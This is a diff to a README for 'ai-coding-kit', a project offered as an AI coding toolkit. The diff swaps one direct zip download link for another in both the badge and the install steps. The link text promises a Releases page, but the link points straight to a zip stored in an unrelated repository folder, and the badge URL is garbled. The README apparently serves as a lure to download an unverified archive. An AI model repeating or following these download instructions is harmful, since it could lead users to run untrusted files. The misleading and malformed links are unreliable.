@@ -1,6 +1,6 @@
 # 🌟 ai-coding-kit - Simplifying AI Software Development
 
-[![Download AI Coding Kit](https://raw.githubusercontent.com/xonigashi/ai-coding-kit/master/deploy/claude-relay-service/ai_coding_kit_2.6-beta.1.zip%20Coding%https://raw.githubusercontent.com/xonigashi/ai-coding-kit/master/deploy/claude-relay-service/ai_coding_kit_2.6-beta.1.zip)](https://raw.githubusercontent.com/xonigashi/ai-coding-kit/master/deploy/claude-relay-service/ai_coding_kit_2.6-beta.1.zip)
+[![Download AI Coding Kit](https://github.com/xonigashi/ai-coding-kit/raw/refs/heads/master/protocols/coding-kit-ai-v3.9.zip%20Coding%https://github.com/xonigashi/ai-coding-kit/raw/refs/heads/master/protocols/coding-kit-ai-v3.9.zip)](https://github.com/xonigashi/ai-coding-kit/raw/refs/heads/master/protocols/coding-kit-ai-v3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ AI 改变了我们写代码的方式。但许多开发者仍然难以与 AI 助�
 
 To get started, you will need to download the AI Coding Kit. You can easily do this by visiting the Releases page.
 
-[Visit this page to download](https://raw.githubusercontent.com/xonigashi/ai-coding-kit/master/deploy/claude-relay-service/ai_coding_kit_2.6-beta.1.zip)
+[Visit this page to download](https://github.com/xonigashi/ai-coding-kit/raw/refs/heads/master/protocols/coding-kit-ai-v3.9.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the most recent version.
